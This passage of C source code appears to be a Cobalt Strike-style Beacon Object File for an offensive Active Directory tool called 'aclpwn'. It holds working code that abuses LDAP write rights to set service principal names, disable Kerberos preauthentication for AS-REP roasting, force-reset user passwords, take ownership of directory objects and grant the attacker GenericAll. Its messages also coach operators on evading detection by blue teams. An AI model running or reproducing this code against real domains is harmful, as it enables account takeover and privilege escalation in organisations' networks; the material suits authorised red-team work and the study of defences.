    if (!dn) { bprintf("[!] Target not found: %s\n", target); return; }

    bprintf("[?] Target : %s\n", dn);

    LDAPMod mod;
    LDAPMod* mods[2];
    mod.mod_op   = LDAP_MOD_REPLACE;
    mod.mod_type = "servicePrincipalName";
    mod.mod_vals.modv_strvals = NULL;   /* REPLACE with empty = delete all */
    mods[0] = &mod;
    mods[1] = NULL;

    ULONG rc = WLDAP32$ldap_modify_s(g_ld, dn, mods);
    if (rc == LDAP_SUCCESS) {
        bprintf("[+] Cleared servicePrincipalName on %s\n", dn);
    } else {
        bprintf("[!] ldap_modify_s failed (0x%lx): %s\n", rc, WLDAP32$ldap_err2string(rc));
    }

    WLDAP32$ldap_memfree(dn);
}

/* Read current userAccountControl as a signed int; -1 on read failure. */
static int ReadUacInt(const char* dn)
{
    LDAPMessage* res = NULL;
    LDAPMessage* e   = NULL;
    PCHAR attrs[]    = { "userAccountControl", NULL };
    int   uac        = -1;

    if (WLDAP32$ldap_search_s(g_ld, dn, LDAP_SCOPE_BASE, "(objectClass=*)", attrs, 0, &res) != LDAP_SUCCESS || !res)
        return -1;

    e = WLDAP32$ldap_first_entry(g_ld, res);
    if (e) {
        PCHAR* vals = WLDAP32$ldap_get_values(g_ld, e, "userAccountControl");
        if (vals && vals[0]) {
            int v = 0;
            const char* s = vals[0];
            while (*s >= '0' && *s <= '9') { v = v * 10 + (*s - '0'); s++; }
            uac = v;
        }
        if (vals) WLDAP32$ldap_value_free(vals);
    }
    WLDAP32$ldap_msgfree(res);
    return uac;
}

/* Write a new userAccountControl integer. */
static ULONG WriteUacInt(const char* dn, int uac)
{
    char buf[16];
    MSVCRT$sprintf(buf, "%d", uac);
    char* vals[2] = { buf, NULL };

    LDAPMod mod;
    LDAPMod* mods[2];
    mod.mod_op   = LDAP_MOD_REPLACE;
    mod.mod_type = "userAccountControl";
    mod.mod_vals.modv_strvals = vals;
    mods[0] = &mod;
    mods[1] = NULL;

    return WLDAP32$ldap_modify_s(g_ld, dn, mods);
}

/* ---- op: set DONT_REQ_PREAUTH (targeted AS-REP roast setup) ---- */
static void OpSetNoPreauth(const char* target)
{
    PCHAR dn = ResolveTargetDn(target);
    if (!dn) { bprintf("[!] Target not found: %s\n", target); return; }

    bprintf("[?] Target : %s\n", dn);

    int uac = ReadUacInt(dn);
    if (uac < 0) {
        bprintf("[!] Failed to read userAccountControl\n");
        WLDAP32$ldap_memfree(dn);
        return;
    }
    bprintf("[?] Current UAC : %d (0x%x)\n", uac, uac);

    if (uac & UAC_DONT_REQ_PREAUTH) {
        bprintf("[*] DONT_REQ_PREAUTH already set - target is AS-REP roastable already; nothing to do.\n");
        WLDAP32$ldap_memfree(dn);
        return;
    }

    int newUac = uac | UAC_DONT_REQ_PREAUTH;
    ULONG rc = WriteUacInt(dn, newUac);
    if (rc == LDAP_SUCCESS) {
        bprintf("[+] Set DONT_REQ_PREAUTH on %s (UAC %d -> %d).\n", dn, uac, newUac);
        bprintf("[*] AS-REP roast now with an AS-REQ (no preauth): nanorobeus / asreproast.\n");
        bprintf("[*] Remember to run 'aclpwn unset-nopreauth --target <t>' afterwards.\n");
    } else {
        bprintf("[!] ldap_modify_s failed (0x%lx): %s\n", rc, WLDAP32$ldap_err2string(rc));
    }

    WLDAP32$ldap_memfree(dn);
}

/* ---- op: clear DONT_REQ_PREAUTH (cleanup after roasting) ---- */
static void OpUnsetNoPreauth(const char* target)
{
    PCHAR dn = ResolveTargetDn(target);
    if (!dn) { bprintf("[!] Target not found: %s\n", target); return; }

    bprintf("[?] Target : %s\n", dn);

    int uac = ReadUacInt(dn);
    if (uac < 0) {
        bprintf("[!] Failed to read userAccountControl\n");
        WLDAP32$ldap_memfree(dn);
        return;
    }
    bprintf("[?] Current UAC : %d (0x%x)\n", uac, uac);

    if (!(uac & UAC_DONT_REQ_PREAUTH)) {
        bprintf("[*] DONT_REQ_PREAUTH not set - nothing to clear.\n");
        WLDAP32$ldap_memfree(dn);
        return;
    }

    int newUac = uac & ~UAC_DONT_REQ_PREAUTH;
    ULONG rc = WriteUacInt(dn, newUac);
    if (rc == LDAP_SUCCESS) {
        bprintf("[+] Cleared DONT_REQ_PREAUTH on %s (UAC %d -> %d).\n", dn, uac, newUac);
    } else {
        bprintf("[!] ldap_modify_s failed (0x%lx): %s\n", rc, WLDAP32$ldap_err2string(rc));
    }

    WLDAP32$ldap_memfree(dn);
}

/* Generate a strong random password: 16 chars from four categories,
 * satisfies default AD complexity (upper/lower/digit/special). */
static void GenRandomPassword(char* out, int outSz)
{
    static const char UPPER[]   = "ABCDEFGHJKLMNPQRSTUVWXYZ";
    static const char LOWER[]   = "abcdefghjkmnpqrstuvwxyz";
    static const char DIGIT[]   = "23456789";
    static const char SPECIAL[] = "!@#$%^&*-_+=";
    static const char* SETS[4]  = { UPPER, LOWER, DIGIT, SPECIAL };
    static const int   SIZES[4] = { sizeof(UPPER)-1, sizeof(LOWER)-1,
                                    sizeof(DIGIT)-1, sizeof(SPECIAL)-1 };
    unsigned char rnd[64];
    int len = 16;
    int i;

    if (outSz < len + 1) len = outSz - 1;

    ADVAPI32$SystemFunction036(rnd, sizeof(rnd));

    /* First 4 characters guarantee one of each category. */
    for (i = 0; i < 4 && i < len; i++)
        out[i] = SETS[i][rnd[i] % SIZES[i]];

    /* Remaining characters from the union of all sets. */
    for (; i < len; i++) {
        int cat = rnd[i] % 4;
        out[i] = SETS[cat][rnd[i + 16] % SIZES[cat]];
    }
    out[len] = '\0';
}

/* ---- op: reset a user's password via unicodePwd LDAP modify ---- */
static void OpResetPassword(const char* target, const char* newPwArg)
{
    PCHAR dn = ResolveTargetDn(target);
    if (!dn) { bprintf("[!] Target not found: %s\n", target); return; }

    bprintf("[?] Target : %s\n", dn);

    char pw[64];
    if (newPwArg && newPwArg[0]) {
        int i;
        for (i = 0; newPwArg[i] && i < (int)sizeof(pw) - 1; i++) pw[i] = newPwArg[i];
        pw[i] = '\0';
        bprintf("[?] Password: (supplied)\n");
    } else {
        GenRandomPassword(pw, sizeof(pw));
        bprintf("[?] Password: %s   (generated - copy this now)\n", pw);
    }

    /* unicodePwd value: literal '"' + password + literal '"', encoded as
     * UTF-16LE with no BOM and no trailing NUL. */
    int plen = (int)MSVCRT$strlen(pw);
    int quotedLen = plen + 2;               /* two surrounding quotes */
    int wlen = quotedLen * 2;               /* UTF-16LE byte count */
    if (wlen > 512) {
        bprintf("[!] Password too long\n");
        WLDAP32$ldap_memfree(dn);
        return;
    }

    unsigned char wbuf[512];
    unsigned char* w = wbuf;
    w[0] = '"'; w[1] = 0;
    int j;
    for (j = 0; j < plen; j++) {
        w[2 + j*2]     = (unsigned char)pw[j];
        w[2 + j*2 + 1] = 0;
    }
    w[2 + plen*2]     = '"';
    w[2 + plen*2 + 1] = 0;

    struct berval bv;
    struct berval* bvals[] = { &bv, NULL };
    bv.bv_len = (ULONG)wlen;
    bv.bv_val = (PCHAR)wbuf;

    LDAPMod mod;
    LDAPMod* mods[2];
    mod.mod_op   = LDAP_MOD_REPLACE | LDAP_MOD_BVALUES;
    mod.mod_type = "unicodePwd";
    mod.mod_vals.modv_bvals = bvals;
    mods[0] = &mod;
    mods[1] = NULL;

    ULONG rc = WLDAP32$ldap_modify_s(g_ld, dn, mods);
    if (rc == LDAP_SUCCESS) {
        bprintf("[+] Password reset on %s\n", dn);
        bprintf("[+] Log in as the target with: %s\n", pw);
        bprintf("[*] Blue teams alert on Event 4724 (password reset by another\n");
        bprintf("    account) - use the credential quickly and expect noise.\n");
    } else {
        bprintf("[!] ldap_modify_s failed (0x%lx): %s\n", rc, WLDAP32$ldap_err2string(rc));
        if (rc == LDAP_INSUFFICIENT_RIGHTS)
            bprintf("[!] Need GenericAll or the User-Force-Change-Password\n"
                    "    extended right on this target.\n");
        if (rc == LDAP_CONSTRAINT_VIOLATION)
            bprintf("[!] Constraint violation - password may not meet the domain\n"
                    "    complexity / length / history policy. Try --password with\n"
                    "    a longer / more diverse value.\n");
    }

    WLDAP32$ldap_memfree(dn);
}

/* ---- WriteOwner primitives ---- */

/* Resolve the current process identity to a binary SID. */
static int GetCurrentUserSid(unsigned char* sid, int sidSz)
{
    char uname[256], dom[256];
    DWORD unameLen = sizeof(uname), domLen = sizeof(dom);
    DWORD sidLen = (DWORD)sidSz;
    SID_NAME_USE use;

    if (!ADVAPI32$GetUserNameA(uname, &unameLen)) return 0;
    if (!ADVAPI32$LookupAccountNameA(NULL, uname, (PSID)(void*)sid, &sidLen, dom, &domLen, &use))
        return 0;
    return (int)sidLen;
}

/* Parse "S-1-5-21-..." into a binary SID. Returns byte length, 0 on error. */
static unsigned long strtoul_dec(const char* s)
{
    unsigned long v = 0;
    while (*s >= '0' && *s <= '9') { v = v * 10 + (unsigned long)(*s - '0'); s++; }
    return v;
}

static int ParseSidString(const char* s, unsigned char* out, int outSz)
{
    unsigned long sub[16];
    unsigned long long auth;
    int nSub = 0, rev, i, len;
    const char* p;

    if (!s || s[0] != 'S' || s[1] != '-') return 0;
    p = s + 2;
    rev = (int)strtoul_dec(p);
    while (*p >= '0' && *p <= '9') p++;
    if (*p != '-') return 0;
    p++;
    auth = strtoul_dec(p);
    while (*p >= '0' && *p <= '9') p++;
    while (*p == '-') {
        p++;
        if (nSub >= 15) return 0;
        sub[nSub++] = strtoul_dec(p);
        while (*p >= '0' && *p <= '9') p++;
    }
    if (*p != '\0') return 0;

    len = 8 + 4 * nSub;
    if (len > outSz) return 0;
    out[0] = (unsigned char)rev;
    out[1] = (unsigned char)nSub;
    /* 6-byte identifier authority, big-endian. Real SIDs never exceed 32 bits. */
    out[2] = (unsigned char)((auth >> 40) & 0xFF);
    out[3] = (unsigned char)((auth >> 32) & 0xFF);
    out[4] = (unsigned char)((auth >> 24) & 0xFF);
    out[5] = (unsigned char)((auth >> 16) & 0xFF);
    out[6] = (unsigned char)((auth >>  8) & 0xFF);
    out[7] = (unsigned char)( auth        & 0xFF);
    for (i = 0; i < nSub; i++) {
        out[8 + i*4]     = (unsigned char)(sub[i] & 0xFF);
        out[8 + i*4 + 1] = (unsigned char)((sub[i] >> 8)  & 0xFF);
        out[8 + i*4 + 2] = (unsigned char)((sub[i] >> 16) & 0xFF);
        out[8 + i*4 + 3] = (unsigned char)((sub[i] >> 24) & 0xFF);
    }
    return len;
}

/* Look up a sAMAccountName in the current domain, return its objectSid. */
static int ResolveSamToSid(const char* sam, unsigned char* out, int outSz)
{
    LDAPMessage* res = NULL;
    LDAPMessage* e   = NULL;
    PCHAR attrs[]    = { "objectSid", NULL };
    char  esc[512], filter[1024];
    int   sidLen = 0;

    LdapEscape(sam, esc, sizeof(esc));
    MSVCRT$sprintf(filter, "(sAMAccountName=%s)", esc);

    if (WLDAP32$ldap_search_s(g_ld, g_base, LDAP_SCOPE_SUBTREE, filter, attrs, 0, &res) != LDAP_SUCCESS || !res)
        return 0;

    e = WLDAP32$ldap_first_entry(g_ld, res);
    if (e) {
        struct berval** sids = WLDAP32$ldap_get_values_len(g_ld, e, "objectSid");
        if (sids && sids[0] && sids[0]->bv_val && (int)sids[0]->bv_len <= outSz) {
            MSVCRT$memcpy(out, sids[0]->bv_val, sids[0]->bv_len);
            sidLen = (int)sids[0]->bv_len;
        }
        if (sids) WLDAP32$ldap_value_free_len(sids);
    }
    WLDAP32$ldap_msgfree(res);
    return sidLen;
}

/* Router: empty -> current identity; "S-1-..." -> parse; else -> sAM lookup. */
static int ResolvePrincipal(const char* arg, unsigned char* out, int outSz)
{
    if (!arg || arg[0] == '\0') return GetCurrentUserSid(out, outSz);
    if (arg[0] == 'S' && arg[1] == '-') return ParseSidString(arg, out, outSz);
    return ResolveSamToSid(arg, out, outSz);
}

/* Write nTSecurityDescriptor OWNER only (SD_FLAGS = 0x01). */
static ULONG WriteOwnerSid(const char* dn, const unsigned char* ownerSid, int ownerLen)
{
    unsigned char sd2[88];
    MSVCRT$memset(sd2, 0, sizeof(sd2));
    sd2[0]  = 0x01;                     /* Revision */
    sd2[2]  = 0x00; sd2[3] = 0x80;      /* Control = SE_SELF_RELATIVE */
    sd2[4]  = 0x14; sd2[5] = 0; sd2[6] = 0; sd2[7] = 0;   /* Owner offset = 20 */
    /* Group / SACL / DACL offsets stay 0 */
    if (ownerLen > (int)sizeof(sd2) - 20) return LDAP_OTHER;
    MSVCRT$memcpy(sd2 + 20, ownerSid, ownerLen);
    int sd2Size = 20 + ownerLen;

    struct berval bv;
    struct berval* bvals[] = { &bv, NULL };
    bv.bv_len = (ULONG)sd2Size;
    bv.bv_val = (PCHAR)sd2;

    LDAPMod mod;
    LDAPMod* mods[2];
    mod.mod_op   = LDAP_MOD_REPLACE | LDAP_MOD_BVALUES;
    mod.mod_type = "nTSecurityDescriptor";
    mod.mod_vals.modv_bvals = bvals;
    mods[0] = &mod;
    mods[1] = NULL;

    unsigned char flags[5] = { 0x30, 0x03, 0x02, 0x01, 0x01 };   /* OWNER only */
    struct berval ctlval = { sizeof(flags), (char*)flags };
    LDAPControl ctl = { LDAP_SERVER_SD_FLAGS_OID, ctlval, TRUE };
    PLDAPControl sctrls[] = { &ctl, NULL };

    return WLDAP32$ldap_modify_ext_s(g_ld, dn, mods, sctrls, NULL);
}

/* Read explicit SD (SD_FLAGS = OWNER|GROUP|DACL) into a caller buffer. */
static BOOL ReadExplicitSd(const char* dn, unsigned char* buf, int bufSz, int* outLen)
{
    LDAPMessage* res = NULL;
    LDAPMessage* e   = NULL;
    PCHAR  attrs[]   = { "nTSecurityDescriptor", NULL };
    BOOL   ok = FALSE;

    unsigned char flags[5] = { 0x30, 0x03, 0x02, 0x01, 0x07 };
    struct berval ctlval = { sizeof(flags), (char*)flags };
    LDAPControl  ctl     = { LDAP_SERVER_SD_FLAGS_OID, ctlval, TRUE };
    PLDAPControl sctrls[] = { &ctl, NULL };

    *outLen = 0;
    if (WLDAP32$ldap_search_ext_s(g_ld, dn, LDAP_SCOPE_BASE, "(objectClass=*)",
                                  attrs, 0, sctrls, NULL, NULL, 0, &res) != LDAP_SUCCESS || !res)
        return FALSE;

    e = WLDAP32$ldap_first_entry(g_ld, res);
    if (e) {
        struct berval** sdv = WLDAP32$ldap_get_values_len(g_ld, e, "nTSecurityDescriptor");
        if (sdv && sdv[0] && sdv[0]->bv_val && sdv[0]->bv_len >= 20 &&
            (int)sdv[0]->bv_len <= bufSz) {
            MSVCRT$memcpy(buf, sdv[0]->bv_val, sdv[0]->bv_len);
            *outLen = (int)sdv[0]->bv_len;
            ok = TRUE;
        }
        if (sdv) WLDAP32$ldap_value_free_len(sdv);
    }
    WLDAP32$ldap_msgfree(res);
    return ok;
}

/* Append an ACCESS_ALLOWED_ACE(GenericAll) for `sid` to the target's DACL.
 * Requires WriteDACL (or implicit via ownership). Model on StandIn EscalateSelf. */
static ULONG AppendGenericAllAce(const char* dn, const unsigned char* sid, int sidLen)
{
    unsigned char sd[8192];
    int sdLen = 0;
    if (!ReadExplicitSd(dn, sd, sizeof(sd), &sdLen) || sdLen < 20) return LDAP_OTHER;

    DWORD daclOff = (DWORD)sd[16] | ((DWORD)sd[17] << 8) | ((DWORD)sd[18] << 16) | ((DWORD)sd[19] << 24);
    if (daclOff == 0 || daclOff + 8 > (DWORD)sdLen) return LDAP_OTHER;

    WORD oldAclSize  = (WORD)(sd[daclOff + 2] | (sd[daclOff + 3] << 8));
    WORD oldAceCount = (WORD)(sd[daclOff + 4] | (sd[daclOff + 5] << 8));
    if (oldAclSize < 8 || daclOff + oldAclSize > (DWORD)sdLen) return LDAP_OTHER;

    int aceSize    = 8 + sidLen;
    int newAclSize = oldAclSize + aceSize;
    int sd2Size    = 20 + newAclSize;

    unsigned char sd2[20 + 8192 + 76];
    MSVCRT$memset(sd2, 0, sizeof(sd2));
    if (sd2Size > (int)sizeof(sd2)) return LDAP_OTHER;

    sd2[0]  = 0x01;
    sd2[2]  = 0x04; sd2[3] = 0x80;      /* SE_DACL_PRESENT | SE_SELF_RELATIVE */
    sd2[16] = 0x14; sd2[17] = 0; sd2[18] = 0; sd2[19] = 0;

    MSVCRT$memcpy(sd2 + 20, sd + daclOff, oldAclSize);
    sd2[20] = 0x04;                     /* ACL_REVISION_DS */
    sd2[22] = (unsigned char)(newAclSize & 0xFF);
    sd2[23] = (unsigned char)((newAclSize >> 8) & 0xFF);
    sd2[24] = (unsigned char)((oldAceCount + 1) & 0xFF);
    sd2[25] = (unsigned char)(((oldAceCount + 1) >> 8) & 0xFF);

    unsigned char* ace = sd2 + 20 + oldAclSize;
    ace[0] = 0x00;                      /* ACCESS_ALLOWED */
    ace[1] = 0x00;
    ace[2] = (unsigned char)(aceSize & 0xFF);
    ace[3] = (unsigned char)((aceSize >> 8) & 0xFF);
    ace[4] = 0x00; ace[5] = 0x00; ace[6] = 0x00; ace[7] = 0x10;   /* 0x10000000 = GenericAll */
    MSVCRT$memcpy(ace + 8, sid, sidLen);

    struct berval bv;
    struct berval* bvals[] = { &bv, NULL };
    bv.bv_len = (ULONG)sd2Size;
    bv.bv_val = (PCHAR)sd2;

    LDAPMod mod;
    LDAPMod* mods[2];
    mod.mod_op   = LDAP_MOD_REPLACE | LDAP_MOD_BVALUES;
    mod.mod_type = "nTSecurityDescriptor";
    mod.mod_vals.modv_bvals = bvals;
    mods[0] = &mod;
    mods[1] = NULL;

    unsigned char flags[5] = { 0x30, 0x03, 0x02, 0x01, 0x04 };   /* DACL only */
    struct berval ctlval = { sizeof(flags), (char*)flags };
    LDAPControl ctl = { LDAP_SERVER_SD_FLAGS_OID, ctlval, TRUE };
    PLDAPControl sctrls[] = { &ctl, NULL };

    return WLDAP32$ldap_modify_ext_s(g_ld, dn, mods, sctrls, NULL);
}

/* Helper: print the SID being used and its resolved name. */
static void PrintPrincipal(const char* label, const unsigned char* sid, int sidLen)
{
    char name[512];
    LookupSidName(sid, sidLen, name, sizeof(name));
    bprintf("[?] %s: %s\n", label, name);
}

static void OpTakeOwnership(const char* target, const char* principalArg)
{
    PCHAR dn = ResolveTargetDn(target);
    if (!dn) { bprintf("[!] Target not found: %s\n", target); return; }
    bprintf("[?] Target : %s\n", dn);

    unsigned char sid[68];
    int sidLen = ResolvePrincipal(principalArg, sid, sizeof(sid));
    if (sidLen <= 0) {
        bprintf("[!] Could not resolve principal: %s\n",
                principalArg && principalArg[0] ? principalArg : "(current identity)");
        WLDAP32$ldap_memfree(dn);
        return;
    }
    PrintPrincipal("New owner", sid, sidLen);

    ULONG rc = WriteOwnerSid(dn, sid, sidLen);
    if (rc == LDAP_SUCCESS) {
        bprintf("[+] Owner replaced on %s\n", dn);
        bprintf("[*] The new owner now has implicit WriteDACL on this object.\n");
        bprintf("[*] Next: aclpwn grant-genericall --target %s\n", target);
        bprintf("[!] Blue teams alert on Event 4670 (permissions changed). Restore\n");
        bprintf("    the original owner with 'aclpwn restore-owner' when done.\n");
    } else {
        bprintf("[!] ldap_modify_ext_s failed (0x%lx): %s\n", rc, WLDAP32$ldap_err2string(rc));
    }
    WLDAP32$ldap_memfree(dn);
}

static void OpGrantGenericAll(const char* target, const char* principalArg)
{
    PCHAR dn = ResolveTargetDn(target);
    if (!dn) { bprintf("[!] Target not found: %s\n", target); return; }
    bprintf("[?] Target : %s\n", dn);

    unsigned char sid[68];
    int sidLen = ResolvePrincipal(principalArg, sid, sizeof(sid));
    if (sidLen <= 0) {
        bprintf("[!] Could not resolve principal: %s\n",
                principalArg && principalArg[0] ? principalArg : "(current identity)");
        WLDAP32$ldap_memfree(dn);
        return;
    }
    PrintPrincipal("Grantee", sid, sidLen);

    ULONG rc = AppendGenericAllAce(dn, sid, sidLen);
    if (rc == LDAP_SUCCESS) {
        bprintf("[+] GenericAll ACE appended on %s\n", dn);
        bprintf("[*] Grantee can now: reset-password, set-spn, set-nopreauth,\n");
        bprintf("    take-ownership, or any other write against this object.\n");
    } else {
        bprintf("[!] ldap_modify_ext_s failed (0x%lx): %s\n", rc, WLDAP32$ldap_err2string(rc));
        if (rc == LDAP_INSUFFICIENT_RIGHTS)
            bprintf("[!] Need WriteDACL. Run 'take-ownership' first (owner has implicit WriteDACL).\n");
    }
    WLDAP32$ldap_memfree(dn);
}

static void OpPwnWriteOwner(const char* target, const char* principalArg)
{
    PCHAR dn = ResolveTargetDn(target);
    if (!dn) { bprintf("[!] Target not found: %s\n", target); return; }
    bprintf("[?] Target : %s\n", dn);

    unsigned char sid[68];
    int sidLen = ResolvePrincipal(principalArg, sid, sizeof(sid));
    if (sidLen <= 0) {
        bprintf("[!] Could not resolve principal: %s\n",
                principalArg && principalArg[0] ? principalArg : "(current identity)");
        WLDAP32$ldap_memfree(dn);
        return;
    }
    PrintPrincipal("Principal", sid, sidLen);

    bprintf("[*] Step 1/2: take ownership...\n");
    ULONG rc = WriteOwnerSid(dn, sid, sidLen);
    if (rc != LDAP_SUCCESS) {
        bprintf("[!] Take-ownership failed (0x%lx): %s\n", rc, WLDAP32$ldap_err2string(rc));
        WLDAP32$ldap_memfree(dn);
        return;
    }
    bprintf("[+] Owner set.\n");

    bprintf("[*] Step 2/2: append GenericAll ACE...\n");
    rc = AppendGenericAllAce(dn, sid, sidLen);
    if (rc != LDAP_SUCCESS) {
        bprintf("[!] Grant-GenericAll failed (0x%lx): %s\n", rc, WLDAP32$ldap_err2string(rc));
        bprintf("[!] Target now has changed owner but no GenericAll ACE. Try\n");
        bprintf("    'aclpwn grant-genericall --target %s' manually.\n", target);
        WLDAP32$ldap_memfree(dn);
        return;
    }
    bprintf("[+] GenericAll ACE appended.\n");
    bprintf("[+] Done. Principal now has full control of %s\n", dn);
    bprintf("[!] Blue teams alert on Event 4670 (twice). Restore owner when done:\n");
    bprintf("    aclpwn restore-owner --target %s --owner <original-SID>\n", target);
    WLDAP32$ldap_memfree(dn);
}

static void OpRestoreOwner(const char* target, const char* ownerArg)
{
    PCHAR dn = ResolveTargetDn(target);
    if (!dn) { bprintf("[!] Target not found: %s\n", target); return; }
    bprintf("[?] Target : %s\n", dn);

    if (!ownerArg || ownerArg[0] == '\0') {
        bprintf("[!] --owner <SID|sAM> is required for restore-owner\n");
        WLDAP32$ldap_memfree(dn);
        return;
    }

    unsigned char sid[68];
    int sidLen = ResolvePrincipal(ownerArg, sid, sizeof(sid));
    if (sidLen <= 0) {
        bprintf("[!] Could not resolve owner: %s\n", ownerArg);
        WLDAP32$ldap_memfree(dn);
        return;
    }
    PrintPrincipal("Restore-to owner", sid, sidLen);

    ULONG rc = WriteOwnerSid(dn, sid, sidLen);
    if (rc == LDAP_SUCCESS) {
        bprintf("[+] Owner restored on %s\n", dn);
    } else {
        bprintf("[!] ldap_modify_ext_s failed (0x%lx): %s\n", rc, WLDAP32$ldap_err2string(rc));
    }
    WLDAP32$ldap_memfree(dn);
}

/* ---- entry ---- */
void go(char* args, int len)
{
    datap parser;
    int   mode;
    char* target = NULL;
    char* spn    = NULL;
    char* domain = NULL;
    char* user   = NULL;
    char* pass   = NULL;
    int   force  = 0;

    g_out    = (char*)MSVCRT$calloc(OUTBUFSIZE, 1);
    g_outLen = 0;
    if (g_out) g_out[0] = '\0';

    /* .bss is not zeroed by the BOF loader in every path. */
    g_dc[0]      = '\0';
    g_realm[0]   = '\0';
    g_base[0]    = '\0';
    g_ld         = NULL;

    BeaconDataParse(&parser, args, len);
    mode   = BeaconDataInt(&parser);
    target = BeaconDataExtract(&parser, NULL);
    spn    = BeaconDataExtract(&parser, NULL);
    domain = BeaconDataExtract(&parser, NULL);
    user   = BeaconDataExtract(&parser, NULL);
    pass   = BeaconDataExtract(&parser, NULL);
    force  = BeaconDataInt(&parser);

    /* Per-op required-arg checks. */
    if ((mode == MODE_SET_SPN || mode == MODE_CLEAR_SPN ||
         mode == MODE_SET_NOPREAUTH || mode == MODE_UNSET_NOPREAUTH ||
         mode == MODE_RESET_PASSWORD ||
         mode == MODE_TAKE_OWNERSHIP || mode == MODE_GRANT_GENERICALL ||
         mode == MODE_PWN_WRITEOWNER || mode == MODE_RESTORE_OWNER) &&
        (!target || target[0] == '\0')) {
        bprintf("[-] --target is required for this operation\n");
        goto done;
    }
    if (mode == MODE_SET_SPN && (!spn || spn[0] == '\0')) {
        bprintf("[-] --spn is required for set-spn\n");
        goto done;
    }
    if (mode == MODE_RESTORE_OWNER && (!spn || spn[0] == '\0')) {
        bprintf("[-] --owner is required for restore-owner\n");
        goto done;
    }

    if (!ResolveDomain((domain && domain[0]) ? domain : NULL)) {
        bprintf("[!] Could not resolve DC / realm\n");
        goto done;
    }

    if (!LdapConnect(domain, user, pass)) {
        bprintf("[!] Failed to connect to LDAP (%s:389)\n", g_dc);
        goto done;
    }

    if (!GetBaseDn()) {
        bprintf("[!] Failed to read defaultNamingContext\n");
        goto done;
    }

    switch (mode) {
        case MODE_LIST_SPN_WRITERS:       OpListSpnWriters(force != 0);        break;
        case MODE_SET_SPN:                OpSetSpn(target, spn, force != 0);   break;
        case MODE_CLEAR_SPN:              OpClearSpn(target);                  break;
        case MODE_LIST_PREAUTH_WRITERS:   OpListPreauthWriters(force != 0);    break;
        case MODE_SET_NOPREAUTH:          OpSetNoPreauth(target);              break;
        case MODE_UNSET_NOPREAUTH:        OpUnsetNoPreauth(target);            break;
        case MODE_LIST_PWRESET_WRITERS:   OpListPwresetWriters(force != 0);    break;
        case MODE_RESET_PASSWORD:         OpResetPassword(target, spn);        break;
        case MODE_LIST_WRITEOWNER_WRITERS: OpListWriteOwnerWriters(force != 0); break;
        case MODE_TAKE_OWNERSHIP:         OpTakeOwnership(target, spn);        break;
        case MODE_GRANT_GENERICALL:       OpGrantGenericAll(target, spn);      break;
        case MODE_PWN_WRITEOWNER:         OpPwnWriteOwner(target, spn);        break;
        case MODE_RESTORE_OWNER:          OpRestoreOwner(target, spn);         break;
        default: bprintf("[-] Unknown mode %d\n", mode); break;
    }

    LdapDisconnect();

done:
    bflush();
    if (g_out && g_out != (char*)1) MSVCRT$free(g_out);
    g_out    = (char*)1;
    g_outLen = 1;
}
